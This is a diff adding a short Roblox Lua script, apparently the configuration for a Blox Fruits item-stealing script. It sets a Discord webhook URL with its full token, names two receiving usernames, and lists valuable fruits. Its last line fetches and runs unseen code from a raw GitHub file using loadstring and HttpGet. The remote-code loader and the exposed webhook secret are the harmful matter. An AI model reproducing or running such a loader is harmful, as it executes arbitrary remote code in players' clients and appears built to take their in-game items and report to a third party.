@@ -1,0 +1,8 @@
+Webhook = "https://discord.com/api/webhooks/1347059375587725355/I3EUsiVpC95DZS-Z_I5eSQ5fsCdlefvWICIhDdUcErZuTtxtG2EQ6wF_RWO5M34SobgP"
+Usernames = {"miepe76543", "GAMINGSURVIVAL01"}
+Fruits = {"Portal-Portal", "Quake-Quake", "Yeti-Yeti", "Dragon (East)-Dragon (East)", "Dragon (West)-Dragon (West)", "Spirit-Spirit"}
+FruitsToReset = {
+    "Spike-Spike"
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/script/refs/heads/main/note"))()
